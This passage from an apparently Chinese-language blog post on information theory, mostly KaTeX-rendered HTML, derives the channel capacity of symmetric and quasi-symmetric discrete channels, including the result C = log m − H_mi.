class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)]</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.309em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">]</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ni</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.856em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><strong>对称：</strong></p><p>对称信道和强对称信道有类似之处，但是条件更加宽松，只需要每一列是同一个集合的排列，每一行也是同一个集合的排列，不再需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo>→</mo><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i \rightarrow b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，也不需要错误映射的可能性平分。</p><p>这样就会出现有趣的性质，因为每一行的和为 1，假设是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>q</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">{q_1,q_2,\cdots,q_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 这 n 个可以重复的元素，那么每一列都包括了其中一个元素，那么如果 m&lt;n，那么列的元素的集合一定是行元素集合的子集。m&gt;n 时，也有对应的结论。</p><img src="http://cdn.blog-blockchain.xyz/202305291533716.png" alt="image-20230527234643705" style="zoom: 50%;" />对于这样的信道矩阵，可以明显知道，每一行的信息量是相等的，也即<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">/</mi><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow></munder><mrow><munder><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow></munder><mi>p</mi></mrow><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mrow><mo fence="true">[</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">]</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>H</mi><mrow><mi>m</mi><mi>i</mi></mrow></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}&amp;H(Y/X)=-\sum_{i=1}{\sum_{j=1}{p}}\left( a_i \right) p\left( b_j/a_i \right) \log p\left( b_j/a_i \right)\\&amp;=-\sum_{i=1}^n{p}\left( a_i \right) \left[ \sum_{j=1}^m{p}\left( b_j/a_i \right) \log p\left( b_j/a_i \right) \right]\\&amp;=H_{mi}\\\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.7276em;vertical-align:-3.6138em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.1138em;"><span style="top:-6.8138em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:-3.35em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:-0.7962em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.6138em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.1138em;"><span style="top:-6.8138em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.35em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">[</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">]</span></span></span></span></span><span style="top:-0.7962em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">mi</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.6138em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>可以发现，和强对称矩阵不一样了，虽然取等条件也是X每个符号等概率，但是最大值是由 Y 的符号个数决定了。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>C</mi><mo>=</mo><munder><mrow><mi>max</mi><mo>⁡</mo></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></munder><mrow><mo fence="true">[</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><msub><mi>H</mi><mrow><mi>m</mi><mi>i</mi></mrow></msub><mo fence="true">]</mo></mrow><mo>=</mo><mi>log</mi><mo>⁡</mo><mi>m</mi><mo>−</mo><msub><mi>H</mi><mrow><mi>m</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">C=\max_{p\left( a_i \right)} \left[ H(Y)-H_{mi} \right] =\log m-H_{mi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.716em;vertical-align:-0.966em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.309em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">(</span></span><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">)</span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.966em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">mi</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">]</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">mi</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><strong>准对称矩阵</strong>：</p><p>每一行都是同一个集合的排列，列不是。但是列可以通过分组，把原来的 n*m 的矩阵，分组成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>∗</mo><msub><mi>m</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>n</mi><mo>∗</mo><msub><mi>m</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>n</mi><mo>∗</mo><msub><mi>m</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">n*m_1, n*m_2,\cdots,n*m_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 